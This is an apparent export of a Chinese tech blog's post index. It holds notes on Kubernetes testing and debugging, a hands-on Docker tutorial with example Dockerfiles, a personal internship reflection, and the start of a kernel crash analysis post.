WHAT=pkg/api # run tests for pkg/apimake test WHAT=&quot;pkg/api pkg/kubelet&quot; # run tests for pkg/api and pkg/kubelet 对包里面具体参数的单元测试。 12345# Runs TestValidatePod in pkg/api/validation with the verbose flag setmake test WHAT=pkg/api/validation KUBE_GOFLAGS=&quot;-v&quot; KUBE_TEST_ARGS=&#x27;-run ^TestValidatePod$&#x27;# Runs tests that match the regex ValidatePod|ValidateConfigMap in pkg/api/validationmake test WHAT=pkg/api/validation KUBE_GOFLAGS=&quot;-v&quot; KUBE_TEST_ARGS=&quot;-run ValidatePod\\|ValidateConfigMap$&quot; 反复运行单元测试 12# Have 2 workers run all tests 5 times each (10 total iterations).make test PARALLEL=2 ITERATION=5 Unit test coverage获取测试覆盖率，以下命令会生成一个 html 文档，当然也可以对一个 package 做这样的操作。 12make test KUBE_COVER=ymake test WHAT=pkg/kubectl KUBE_COVER=y Benchmark unit tests典型的 benchmark 指令如下： 1go test ./pkg/apiserver -benchmem -run=XXX -bench=BenchmarkWatch 其中： -run&#x3D;XXX 是一个表达式过滤出 test case 来运行。 -bench&#x3D;BenchmarkWatch 将会运行 BenchmarkWatch 中的测试，参考grep -nr BenchmarkWatch . -benchmem 启用内存分配状态 0x42 Integration tests 集成测试仅改访问本地的资源 最普遍的 etcd 或者服务都应该在本地。 所有重大的特性都依赖集成测试 包括 kubectl 这个命令行工具。 首选的测试多场景的或输入的方法是 TableDrivenTests Example: TestNamespaceAuthorization 每一个测试都应创建自己的 master,http server 和 config. Example: TestPodUpdateActiveDeadlineSeconds 安装 etcdk8s 的集成测试需要你的PATH里面有 etcd. 12345678910# Install etcd and add to PATH# Option a) install inside kubernetes roothack/install-etcd.sh # Installs in ./third_party/etcdecho export PATH=&quot;$PATH:$(pwd)/third_party/etcd&quot; &gt;&gt; ~/.profile # Add to PATH# Option b) install manuallygrep -E &quot;image.*etcd&quot; cluster/saltbase/etcd/etcd.manifest # Find version# Install that version using yum/apt-get/etcecho export PATH=&quot;$PATH:&lt;LOCATION&gt;&quot; &gt;&gt; ~/.profile # Add to PATH 许多测试会在内部开始一个 etcd 服务，存储测试数据在操作系统的临时文件目录，如果你看见是因为没有足够磁盘或者一个 volume 不可预知的写延迟导致的test failures, 可以用TEST_ETCD_DIR环境变量来覆盖掉默认的写位置。 运行集成测试1make test-integration # Run all integration tests. 这个脚本会运行test/integration中的测试脚本。 1make test-integration KUBE_GOFLAGS=&quot;-v&quot; KUBE_TEST_ARGS=&quot;-run ^TestPodUpdateActiveDeadlineSeconds$&quot; 可以利用KUBE_TEST_ARGS变量与 hack &#x2F;test-integration.sh 脚本来运行具体的集成测试，上面的是例子。不过KUBE_TEST_ARGS变量被设置过后，那么 test case 将只会在 v1 版本的 api 上跑且watch cachecase 将会被跳过。 0x43 end-to-end testsk8s 的端到端测试提供了一个测试系统中端到端行为的机制，也是确认用户操作是否符合开发者的规范的最后一个信号，尽管单元测试与集成测试提供了不错的信号。现实是像 Kubernetes 分布式系统的情况并不少见问题是 – 微小的变化可能会通过所有单元测试和集成测试，但在系统层面导致了不可预见的变化，端到端的测试弥补了单元测试与集成测试在这方面的不足，它的目标是确认基于 k8s 代码的一致与可靠的行为，并在用户接触前捕获到难以测试的 bug. 在 k8s 的端到端的测试构建基于 Ginkgo 与 Gomega, 它们是 (Behavior-Driven Development (BDD) )[^BDD] 测试框架，在沉浸进测试代码前建议先阅读文档。 典型用法先把环境准备一下： 123export KUBERNETES_PROVIDER=vagrantexport VAGRANT_DEFAULT_PROVIDER=libvirtgo run hack/e2e.go -v --build --up --test --down 运行下面任一指令之一： 12345678910111213141516171819202122232425262728293031# Build binaries for testinggo run hack/e2e.go -v --build# Create a fresh cluster. Deletes a cluster first, if it existsgo run hack/e2e.go -v --up# Run all testsgo run hack/e2e.go -v --test# Run tests matching the regex &quot;\\[Feature:Performance\\]&quot;go run hack/e2e.go -v --test --test_args=&quot;--ginkgo.focus=\\[Feature:Performance\\]&quot;# Conversely, exclude tests that match the regex &quot;Pods.*env&quot;go run hack/e2e.go -v --test --test_args=&quot;--ginkgo.skip=Pods.*env&quot;# Run tests in parallel, skip any that must be run seriallyGINKGO_PARALLEL=y go run hack/e2e.go --v --test --test_args=&quot;--ginkgo.skip=\\[Serial\\]&quot;# Flags can be combined, and their actions will take place in this order:# --build, --up, --test, --down## You can also specify an alternative provider, such as &#x27;aws&#x27;## e.g.:KUBERNETES_PROVIDER=aws go run hack/e2e.go -v --build --up --test --down# -ctl can be used to quickly call kubectl against your e2e cluster. Useful for# cleaning up after a failed test or viewing logs. Use -v to avoid suppressing# kubectl output.go run hack/e2e.go -v -ctl=&#x27;get events&#x27;go run hack/e2e.go -v -ctl=&#x27;delete pod foobar&#x27; 强力清理：在运行期间可以C+c可以正确的关闭，但是如果出现什么错误时候可以还有虚拟机在运行要被强制清除就使用下面命令： 1go run hack/e2e.go -v --down 0x50 debug with development根据社区提供的文档 debug 的方式应该是log与我之前经验是一致的，gdb 对 go 支持太弱了尤其是大型项目中。 debug with gdbgdb 支持 python 写的插件，够使用这个特点让 gdb 支持其 runtime 的 trace. 123define goruntime source /usr/lib/golang/src/runtime/runtime-gdb.pyend 但是实践用起来有点糙，单点全是汇编指令，一把线程，手工调试简直了，不过操作还是还是 gdb 的习惯。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677[root@localhost kubernetes]# make WHAT=cmd/kubectl/can&#x27;t load package: package github.com/kubernetes/kubernetes: no buildable Go source files in /root/workspace/go/src/github.com/kubernetes/kubernetes+++ [0929 04:28:33] Generating bindata: /root/workspace/go/src/github.com/kubernetes/kubernetes/test/e2e/framework/gobindata_util.go+++ [0929 04:28:33] Building the toolchain targets: k8s.io/kubernetes/hack/cmd/teststale+++ [0929 04:28:34] Building go targets for linux/amd64: cmd/kubectl/[root@localhost kubernetes]# ./_output/bin/kubectl versionClient Version: version.Info&#123;Major:&quot;1&quot;, Minor:&quot;5+&quot;, GitVersion:&quot;v1.5.0-alpha.0.1361+aa9880fe246a33-dirty&quot;, GitCommit:&quot;aa9880fe246a33356c89567d5ed5b11f22661540&quot;, GitTreeState:&quot;dirty&quot;, BuildDate:&quot;2016-09-29T06:56:41Z&quot;, GoVersion:&quot;go1.6.3&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;&#125;Unable to connect to the server: Service Unavailable[root@localhost kubernetes]# gdb ./_output/bin/kubectl -q(gdb) b kubectl.go:35Breakpoint 1 at 0x46a2a6: file /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/go/src/k8s.io/kubernetes/cmd/kubectl/app/kubectl.go, line 35.(gdb) rStarting program: /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/bin/linux/amd64/kubectl Missing separate debuginfos, use: dnf debuginfo-install glibc-2.23.1-10.fc24.x86_64[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib64/libthread_db.so.1&quot;.[New Thread 0x7ffff77fa700 (LWP 4062)][New Thread 0x7ffff6ff9700 (LWP 4063)][New Thread 0x7ffff67f8700 (LWP 4064)][New Thread 0x7ffff5ff7700 (LWP 4065)][New Thread 0x7ffff57f6700 (LWP 4066)][New Thread 0x7ffff4c83700 (LWP 4067)][New Thread 0x7fffe7fff700 (LWP 4068)][New Thread 0x7fffe77fe700 (LWP 4069)][New Thread 0x7fffe6ffd700 (LWP 4071)][New Thread 0x7fffe67fc700 (LWP 4074)][New Thread 0x7fffe5ffb700 (LWP 4075)][New Thread 0x7fffe57fa700 (LWP 4076)]Thread 1 &quot;kubectl&quot; hit Breakpoint 1, k8s.io/kubernetes/cmd/kubectl/app.Run (~r0=...) at /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/go/src/k8s.io/kubernetes/cmd/kubectl/app/kubectl.go:3535 defer logs.FlushLogs()(gdb) list 30 WARNING: this logic is duplicated, with minor changes, in cmd/hyperkube/kubectl.go31 Any salient changes here will need to be manually reflected in that file.32 */33 func Run() error &#123;34 logs.InitLogs()35 defer logs.FlushLogs()3637 cmd := cmd.NewKubectlCommand(cmdutil.NewFactory(nil), os.Stdin, os.Stdout, os.Stderr)38 return cmd.Execute()39 &#125;(gdb) bt#0 k8s.io/kubernetes/cmd/kubectl/app.Run (~r0=...) at /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/go/src/k8s.io/kubernetes/cmd/kubectl/app/kubectl.go:35#1 0x00000000004019d8 in main.main () at /root/workspace/go/src/github.com/kubernetes/kubernetes/_output/local/go/src/k8s.io/kubernetes/cmd/kubectl/kubectl.go:26(gdb) info goroutines * 1 running runtime.systemstack_switch* 17 syscall runtime.goexit 2 waiting runtime.gopark 18 waiting runtime.gopark 19 waiting runtime.gopark 24 waiting runtime.gopark* 34 syscall runtime.notetsleepg 25 waiting runtime.gopark 26 waiting runtime.gopark 27 waiting runtime.gopark 28 waiting runtime.gopark 29 waiting runtime.gopark* 30 running runtime.systemstack_switch 31 waiting runtime.gopark 32 waiting runtime.gopark* 4 syscall runtime.notetsleepg 13 waiting runtime.gopark(gdb) goroutine 2 bt#0 runtime.gopark (unlockf=&#123;void (runtime.g *, void *, bool *)&#125; 0xc820028758, lock=0x39fb5e0 &lt;runtime.forcegc&gt;, reason=&quot;force gc (idle)&quot;, traceEv=20 &#x27;\\024&#x27;, traceskip=1) at /usr/lib/golang/src/runtime/proc.go:263#1 0x000000000042eca4 in runtime.goparkunlock (lock=0x39fb5e0 &lt;runtime.forcegc&gt;, reason=&quot;force gc (idle)&quot;, traceEv=20 &#x27;\\024&#x27;, traceskip=1) at /usr/lib/golang/src/runtime/proc.go:268#2 0x000000000042e9e8 in runtime.forcegchelper () at /usr/lib/golang/src/runtime/proc.go:229#3 0x000000000045ea51 in runtime.goexit () at /usr/lib/golang/src/runtime/asm_amd64.s:1998#4 0x0000000000000000 in ?? () debug with log社区 debug 是使用glog包靠打印 log 来 debug, 其实这样是 go 编程排错非常好的实践.go 是面向并发编程的，用 gdb 这样的工具去调试大量的线程是不人道的。 重点是 -v: As per the comments, the practical default level is V(2). Developers and QE environments may wish to run at V(3) or V(4). If you wish to change the loglevel, you can pass in -v=X where X is the desired maximum level to log. 这是开发对 glog 的 conventions. glog.Errorf() - Always an error glog.Warningf() - Something unexpected, but probably not an error glog.Infof() has multiple levels: glog.V(0) - Generally useful for this to ALWAYS be visible to an operator Programmer errors Logging extra info about a panic CLI argument handling glog.V(1) - A reasonable default log level if you don’t want verbosity. Information about config (listening on X, watching Y) Errors that repeat frequently that relate to conditions that can be corrected (pod detected as unhealthy) glog.V(2) - Useful steady state information about the service and important log messages that may correlate to significant changes in the system. This is the recommended default log level for most systems. Logging HTTP requests and their exit code System state changing (killing pod) Controller state change events (starting pods) Scheduler log messages glog.V(3) - Extended information about changes More info about system state changes glog.V(4) - Debug level verbosity (for now) Logging in particularly thorny parts of code where you may want to come back later and check it [^officialdoc]: official doc[^slideshare]: slideshare[^design]: k8s design[^term]: k8s term[^vagrant]: docs&#x2F;devel&#x2F;local-cluster&#x2F;vagrant[^networking]: docs&#x2F;design&#x2F;networking[^debug]: docs&#x2F;devel&#x2F;logging[^hangon]: network hangon[^devel_guide]: docs&#x2F;devel[^BDD]: 行为驱动开发","tags":["docker"]},{"title":"docker usage","path":"/2016/09/09/docker-usage/","content":"0x00 starting公司准备开容器项目且我被分到了项目组，但对容器技术一无所知，所以这个 post 来记录目前工业界主流容器技术 –docker 的实践过程。 0x01 what’s docker? Docker is the world’s leading software containerization platform. 0x02 why docker? Docker’s commercial solutions provide an out of the box CaaS environment that gives IT Ops teams security and control over their environment, while enabling developers to build applications in a self service way. With a clear separation of concerns and robust tooling, organizations are able to innovate faster, reduce costs and ensure security. 0x03 docker component client&#x2F;server: docker 是一个 c&#x2F;s 架构的服务.server 提供一套完整 RESTful API. image: image 是 docker 创建容器的基础，相当于源码对于程序。 registry: 用来做镜像管理，相当于源码与 git repo 的关系。 containers: 运行起来的实体，相当于多个程序。 0x04 review container容器发展到现在逐步进入了标准化过程，目前有工业界广泛是用的 docker; 还有 coreos 定制的 appc, 目前遵循的 appc 的容器技术有 freebsd 平台的 Jet Pack 和 Linux 平台通过 C++ 实现的 Nose Cone. 0x10 bases usage这里记录一下 docker 在命令行下面最近基本的用法。 0x11 install &amp; configureinstallfedora24 下面安装如此容易。 123# sudo dnf install docker -y# sudo systemctl enable docker# sudo systemctl start docker http proxy[^systemd]因为公司网络安全策略所以需要配置代理服务器。 12345678# sudo mkdir /etc/systemd/system/docker.service.dcat &lt;&lt; EOF &gt;&gt; /etc/systemd/system/docker.service.d/http-proxy.conf[Service]Environment=&quot;HTTP_PROXY=http://username:password@10.0.58.88:8080/&quot;EOF# sudo systemctl daemon-reload# sudo systemctl show --property=Environment docker# sudo systemctl restart docker 0x12 containers managementcreate container运行一个名字叫 sn0rt 的容器且进入 bash. 12# sudo docker run -i --name sn0rt -t ubuntu:14.04 /bin/bashexit status查看当前服务器的容器状态。 123# sudo docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESca06ea65dda8 ubuntu:14.04 &quot;/bin/bash&quot; 30 minutes ago Exited (0) About a minute ago sn0rt attach to container开始曾经停止的容器，附加上去： 12# sudo docker start sn0rt# sudo docker attach sn0rt create demon container123456# sudo docker run --name sn0rt -d ubuntu:14.04 /bin/sh -c &quot;while true;do echo hello word; sleep 1; done&quot;51b1a48d762441717cec525e42022328417f1c5ff9b18c456dbde0a925db7d57# sudo docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES51b1a48d7624 ubuntu:14.04 &quot;/bin/sh -c &#x27;while tr&quot; 10 seconds ago Up 7 seconds sn0rt show logs123# sudo docker logs -ft sn0rt2016-09-09T03:30:47.986708000Z hello word2016-09-09T03:30:49.233008000Z hello word exec in container在容器中运行个非交互式进程后在运行交互式进程。 12345678# sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES51b1a48d7624 ubuntu:14.04 &quot;/bin/sh -c &#x27;while tr&quot; About an hour ago Up About an hour sn0rt# sudo docker exec -d sn0rt touch /tmp/linux# sudo docker exec -t -i sn0rt /bin/bashroot@51b1a48d7624:/# ls /tmp/linux /tmp/linuxroot@51b1a48d7624:/# inspect container获取更多的信息以 json 格式展示，省略部分以...代替。 12345678910111213# sudo docker inspect sn0rt[ &#123; &quot;Id&quot;: &quot;51b1a48d762441717cec525e42022328417f1c5ff9b18c456dbde0a925db7d57&quot;, &quot;Created&quot;: &quot;2016-09-09T03:28:16.986340741Z&quot;, &quot;Path&quot;: &quot;/bin/sh&quot;, &quot;Args&quot;: [ &quot;-c&quot;, &quot;while true; do echo hello word; sleep 1; done&quot; ], ... &#125;] stop and remove不能移除一个在运行的容器。 1234567# sudo docker stop sn0rtsn0rt# sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES# sudo docker rm sn0rtsn0rt# sudo docker rm `docker ps -a -q` 0x13 image management容器镜像的管理，名字叫法类似于 git. pull12345# sudo docker pull ubuntu:14.04Trying to pull repository docker.io/library/ubuntu ... 14.04: Pulling from docker.io/library/ubuntuDigest: sha256:5b5d48912298181c3c80086e7d3982029b288678fccabf2265899199c24d7f89Status: Image is up to date for docker.io/ubuntu:14.04 list1234# sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEtest latest d373bc5e4a77 20 hours ago 340.4 MBdocker.io/ubuntu 14.04 4a725d3b3b1c 13 days ago 187.9 MB search需要先通过docker login登录 docker.io. 123# sudo docker search kaliINDEX NAME DESCRIPTION STARS OFFICIAL AUTOMATEDdocker.io docker.io/kalilinux/kali-linux-docker Kali Linux Rolling Distribution Base Image 216 [OK] remove123456789# sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEtest latest d373bc5e4a77 20 hours ago 340.4 MBdocker.io/ubuntu 14.04 4a725d3b3b1c 13 days ago 187.9 MB# sudo docker rmi testUntagged: test:latest# sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEdocker.io/ubuntu 14.04 4a725d3b3b1c 13 days ago 187.9 MB create(commit)有几种方法可以创建自己的 image, 这里纪录一下 commit 的使用。 123456789101112# sudo docker run -i --name sn0rt -t ubuntu:14.04 /bin/bashroot@41f815d96b7a:/# apt-get update -yqqroot@41f815d96b7a:/# exit# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES41f815d96b7a ubuntu:14.04 &quot;/bin/bash&quot; 4 minutes ago Exited (0) 12 seconds ago sn0rt# docker commit -m=&quot;update finshed&quot; --author=&quot;Sn0rt@abc.shop.edu.cn&quot; 41f815d96b7a sn0rt/ubuntu_updatedsha256:92ae626c3fb58ad14b621d831bc8c1529357824ebbbdf1b2b4691b4d9e84814c# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsn0rt/ubuntu_updated latest 92ae626c3fb5 58 seconds ago 210.1 MBdocker.io/ubuntu 14.04 4a725d3b3b1c 13 days ago 187.9 MB export有时候网络不好，或者某些限制导致你不能通过 pull 来安装 image.docker 提供一个导出的功能可以使用。 1# docker save -o kubedns-amd64.tar gcr.io/google_containers/kubedns-amd64 import上面的导出文件你可以通过下面这个命令把这个文件导入进自己的 docker image. 1# docker load --input kubedns-amd64.tar 0x20 dockerfile[^dockerfile]这是另一种构建自己 image 的方法，也是官方推荐的 (高度可定制).利用 dockerfile 构建三个 images, 命名为 ubuntu,apache 与 mysql.其中 apache 与 mysql 基于 ubuntu_updated, 而 ubuntu_updated 是基于 ubuntu:14.04. ubuntu基本 ubuntu 镜像做一个 update 操作后 build 一下，如果不做的话其实 docker 也会帮你缓存，docker 每命令每镜像 1234567FROM ubuntu:14.04MAINTAINER Sn0rt &lt;Sn0rt@abc.shop.edu.cn&gt;ENV http_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;ENV https_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;RUN apt-get update -yqq 如果写错了可以修改Dockerfile重新 build, 它会自最近一次正确 image 开始继续 build. 12345678910➜ ubuntu docker build -t=&quot;sn0rt/ubuntu&quot; . Sending build context to Docker daemon 2.048 kBStep 1 : FROM ubuntu:14.04 ---&gt; 4a725d3b3b1c...Step 5 : RUN apt-get update -yqq ---&gt; Running in 91e8e54e3be5 ---&gt; 8aae246f5e4cRemoving intermediate container 91e8e54e3be5Successfully built 8aae246f5e4c mysql1234567891011FROM sn0rt/ubuntuMAINTAINER Sn0rt &lt;Sn0rt@abc.shop.edu.cn&gt;ENV http_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;ENV https_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;RUN apt-get install mysql-server -yqqCOPY my.cnf /etc/mysql/my.cnfWORKDIR /rootCOPY init.sql init.sqlRUN /etc/init.d/mysql restart &amp;&amp; mysql &lt; init.sql building:12345678910111213141516# sudo docker build -t=&quot;sn0rt/mysql:v1&quot; .Sending build context to Docker daemon 7.168 kBStep 1 : FROM sn0rt/ubuntu ---&gt; 8aae246f5e4c...Step 9 : RUN /etc/init.d/mysql restart &amp;&amp; mysql &lt; init.sql ---&gt; Running in 73fd2bc50964 * Stopping MySQL database server mysqld ...done. * Starting MySQL database server mysqld ...done. * Checking for tables which need an upgrade, are corrupt or were not closed cleanly. ---&gt; 5d3c0a4fa4edRemoving intermediate container 73fd2bc50964Successfully built 5d3c0a4fa4ed apache利用Dockerfile来安装phpmyadmin. 123456789101112131415161718FROM sn0rt/ubuntuMAINTAINER Sn0rt &lt;Sn0rt@abc.shop.edu.cn&gt;ENV http_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;ENV https_proxy=&quot;http://username:password@10.0.58.88:8080/&quot;RUN apt-get install apache2 -yqqRUN apt-get install php5 libapache2-mod-php5 php5-mcrypt php5-mysql -yqqCOPY dir.conf /etc/apache2/mods-available/dir.confADD phpMyAdmin-4.6.4-all-languages.tar.gz /var/www/html/WORKDIR /var/www/html/phpMyAdmin-4.6.4-all-languages/RUN mv * ..COPY config.inc.php /var/www/html/config.inc.phpENTRYPOINT [&quot;apachectl&quot;]CMD [&quot;-X&quot;] building:12345678910➜ apache docker build -t=&quot;sn0rt/apache:v1&quot; . Sending build context to Docker daemon 10.38 MBStep 1 : FROM sn0rt/ubuntu ---&gt; 8aae246f5e4c...Step 13 : CMD -X ---&gt; Running in 45fa01e8ac4c ---&gt; 366ef630e06fRemoving intermediate container 45fa01e8ac4cSuccessfully built 366ef630e06f checking history通过 history 命令可以查看到历史命令。 1234567891011121314151617181920# sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZEsn0rt/apache v1 366ef630e06f 3 minutes ago 324.8 MBsn0rt/mysql v1 5d3c0a4fa4ed 2 hours ago 345.7 MBsn0rt/ubuntu latest 8aae246f5e4c 2 hours ago 210.1 MBdocker.io/ubuntu 14.04 4a725d3b3b1c 2 weeks ago 187.9 MB# sudo docker history sn0rt/mysql:v1IMAGE CREATED CREATED BY SIZE COMMENT5d3c0a4fa4ed 20 minutes ago /bin/sh -c /etc/init.d/mysql restart &amp;&amp; mysql 5.252 MB 92dba0a2acb2 20 minutes ago /bin/sh -c #(nop) COPY file:77fac40c1774c2ad4 172 B c3df7fa0d3d1 20 minutes ago /bin/sh -c #(nop) WORKDIR /root 0 B ca7a6756a3c7 20 minutes ago /bin/sh -c #(nop) COPY file:30489e5e5529ad833 3.506 kB d06d1ddad673 20 minutes ago /bin/sh -c apt-get install mysql-server -yqq 130.3 MB 91190a6c9e32 22 minutes ago /bin/sh -c #(nop) ENV https_proxy=http://fnst 0 B 7d8936b1f833 22 minutes ago /bin/sh -c #(nop) ENV http_proxy=http://fnsts 0 B f08d8e1643b3 22 minutes ago /bin/sh -c #(nop) MAINTAINER Sn0rt &lt;Sn0rt@abc 0 B 8aae246f5e4c 48 minutes ago /bin/sh -c apt-get update -yqq 22.16 MB 091e0ec51c90 50 minutes ago /bin/sh -c #(nop) ENV https_proxy=http://fnst 0 B 43bff3143ad4 50 minutes ago /bin/sh -c #(nop) ENV http_proxy=http://fnsts 0 B 913e5f034797 50 minutes ago /bin/sh -c #(nop) MAINTAINER Sn0rt &lt;Sn0rt@abc 0 B using需要一个前台进程，如果以 apache 以服务在后台启动的话，容器会变成退出状态。 mysql12345# sudo docker run -d -p 3306:3306 --name mysql sn0rt/mysql:v1 mysqld_safeb946792318652c2d405406e66fbbaa7472a6a5a8dc281c71abe6fd8651070d46# sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb94679231865 sn0rt/mysql:v1 &quot;mysqld_safe&quot; 5 seconds ago Up 2 seconds 0.0.0.0:3306-&gt;3306/tcp mysql apache对外服务提供以一直的 ip 地址 (宿主机器的地址),apache 以前台进程在运行。 12345# docker run -d -p 80:80 --name apache sn0rt/apache:v1# sudo docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESa478f202f3bf sn0rt/apache:v1 &quot;apachectl -X&quot; 47 seconds ago Up 44 seconds 0.0.0.0:80-&gt;80/tcp apacheb94679231865 sn0rt/mysql:v1 &quot;mysqld_safe&quot; 3 minutes ago Up 3 minutes 0.0.0.0:3306-&gt;3306/tcp mysql testing在宿主机器上面进行测试 apache 与 mysql 的端口绑定。 1234567891011121314151617181920212223# sudo curl -I localhostHTTP/1.1 200 OKDate: Mon, 12 Sep 2016 03:23:31 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.19Set-Cookie: pmaCookieVer=5; expires=Wed, 12-Oct-2016 03:23:31 GMT; Max-Age=2592000; path=/; httponlySet-Cookie: phpMyAdmin=npcfgt7puqs2cmld1ttk2k3naa7pv54a; path=/; HttpOnlyExpires: Mon, 12 Sep 2016 03:23:31 +0000...# sudo mysql -u root -p -h 172.17.0.1Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.5.50-0ubuntu0.14.04.1 (Ubuntu)Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.# sudo docker logs mysql160912 03:17:34 mysqld_safe Can&#x27;t log to error log and syslog at the same time. Remove all --log-error configuration options for --syslog to take effect.160912 03:17:34 mysqld_safe Logging to &#x27;/var/log/mysql/error.log&#x27;.160912 03:17:34 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql# sudo docker logs apacheAH00558: apache2: Could not reliably determine the server&#x27;s fully qualified domain name, using 172.17.0.3. Set the &#x27;ServerName&#x27; directive globally to suppress this message 0x30 dockerhub测试完成没有问题，且打算分享你的容器这个时候就可以把它推送到 dockerhub(记得docker login). 123456789101112# sudo docker push sn0rt/ubuntuThe push refers to a repository [docker.io/sn0rt/ubuntu]54da5869939f: Pushed ffb6ddc7582a: Mounted from library/ubuntu 344f56a35ff9: Mounted from library/ubuntu 530d731d21e1: Mounted from library/ubuntu 24fe29584c04: Mounted from library/ubuntu 102fca64f924: Mounted from library/ubuntu latest: digest: sha256:703fec1e8c32ebc0da29d12be2515f640b9022e45c38df62a48145851ad651b6 size: 1549# sudo docker search sn0rt/ubuntuINDEX NAME DESCRIPTION STARS OFFICIAL AUTOMATEDdocker.io docker.io/sn0rt/ubuntu 1 0x40 summary[^docker-hype] layer: 初步接触 docker 发现 layer 这样的设计放到环境部署里面非常实用。但是算不上完全创新，至少我之前 vmware 有尝试过类似的概念，我基于虚拟机的某个配置对其进行快照，然后以快照为基础进行不同的修改，这样自己用起来是没有太多问题的。 dockerfile: docker 官方提供的 dockerfile 组织过于原始，退回了 shell 部署时代，而且 dockerfile build 的依赖关系层级划分是通过多个 docker image 来实现的，这样至少目前可能是需要手工解决依赖 (安装镜像). security: docker 的 Linux 实现依赖于 namespace 与 cgroup,namepsace 本身的安全性 (CVE) 与 cgroup 的颗粒度本身都是不完善的 (cgroup 对网络限制), 从容器中逸出也不是没有可能。 performance: KVM 在运行基于模板生成的虚拟机可以合并相同内存的，容器是共享内核的可以想象一下是节约一点内存;cpu 不需要在 guest 和 host 之间来回切换可能节约一点 cpu 时间。 limit: 作为一个软件安全爱好者有时候对 kernel 本身感兴趣，这时候 docker 就不行了。 [^systemd]: systemd configure[^dockerfile]: dockfile manual[^docker-hype]: docker-hype","tags":["docker"]},{"title":"internship in Shanghai","path":"/2016/08/27/intern-in-shanghai/","content":"从北京到上海。北方热也与南方不一样，南方的热软绵绵的好像中了分筋错骨手一样有力使不出来，北方的热好像铁砂布打磨着你让你狂躁。 试炼の魔都六月上旬，寻思着京城好远而实习补贴很少，因未毕业导致往返学校的开销导致收不抵支，就准备华东找个新实习并提出了离职。然后在拉钩上面投了个简历，就收到了面试，和面试官 (现在的 leader) 聊聊一下 Linux, 然后就收到了 offer, 于是就来到现在的饿了么 – 一家年轻的互联网公司。 魔都初访shanghai 7 月 4 日，期末考试完，因为南京不断下雨导致考完南京几日游得计划泡汤了，所以提前跑路到上海投奔郝姨，准备提前入职。时间好快，上次来上海还是 2014 年 2 月下旬，当时产生的印象就是上海好贵，这一次除了租房对好贵的印象有所改变。租房真是个心痛的事情，为此还交了 500 块学费，一把辛酸泪！发现房子离得近且不错的的贵，离得近且便宜的很破，离得远且不错的也贵，离得远且小一点相对便宜，然后我选了离得远且小一点的。 入职7 月 6 日，大清早带着对新工作一点期望赶着上海的早高峰上路了，地铁上人真像网文里面所描述的讲沙丁鱼，前进的铁壳就是罐头，每条鱼都带着情愿或者不情愿的情绪被罐头运去目的地。我被这样一挤，就有点情绪，开始思考鱼生的意义，作为一个沙丁鱼到底为了什么？可能沙丁鱼的一生本身是没有什么意义的，只有独立鱼格才能赋予它鱼生的意义吧。被运到目的地，签完合同办完新人入职手续，领了新 mac pro, 过了几天领了那个很贵的椅子，又过了过了一段时间领了显示器，这样的待遇传统行业真的不敢想，互联网公司真是时代的弄潮儿。7 月 6 日 6 点下班，追讨被坑的 500 块，身心疲惫，坐上回九亭的地铁上又开始思考鱼生的意义，有种感觉出拳塞进了棉花，进入了贤者模式。 team工作了一段时间可以感觉到团队有活力，同事也很厉害！ 重要的是 team 有爱，以图为证： 妹子 工作Team 是年后成立的，想起来老大吃饭时候的一句吐槽： 没有组建 sre team 之前我是真正的 sre, 现在我是 team 负责参加会的。 在 SRE team, 我主要是实践一些底层技术，具体应用在排障，调优，写一些 linux 相关的需求，都是蛮好玩的。我的 mentor 就是老大，老大是公司前 100 号员工，技术了得，人称汤神！有时候是和孙老师一起玩，他鼓励独立思考，实践自己想法，充分尊重思维多样性; 对思维多样性的尊重是我知道但是没有太认真付诸实践的东西，在这里受教了！ 生活这次实习比之前多了地铁路程，50 分钟单程的车程感觉有点远，但是一想中环附近的房租就平衡好多了，租房的价格也比北京便宜太多了。魔都对比于京城对我来说优势：离家近，气候湿润，雾霾不是特别出名，离学校近，以后不太可能在去北京了。一日三餐好像都和公司有关，早餐是饿了么早餐，可以说是物美价廉; 午餐 team 一起，天天逛商城吃; 晚餐选择加班餐，管饱不要钱。 离职时间真快，两个月，开学了。边上的巨巨离职读研了，巨巨边上的巨巨的边上巨巨请假回学校了，组里面空荡荡的。我也要离职回学校了，有点不想走，因为学校的管理又不得不走，希望学校出现点变化。临走带走了老大对我的实习评语： intern_commit 不足 知识储备： 真切的感受知识储备的不足，在繁长的 log 面前有时候不能定位到主要问题的主要方面，浪费大量时间; 对 linux 工作中用的子系统理解不够深入，如果理解深入可以把部分需求做的更细致。 语言层面： 我之前抱着语言不重要的心态，现在认识到技以载道，组内用 golang, 我需要熟练使用 golang 来表述我对技术的理解。 当然还有其他不过我认为其余的不如上面两个重要。","tags":["life"]},{"title":"analysis of kernel crash","path":"/2016/08/04/kernel-panic/","content":"基于回忆整理 0x00 beginning昨天早上我还在吃早餐，老大对我讲我们的服务器挂了，kernel 在临死前留下了一个 dump. 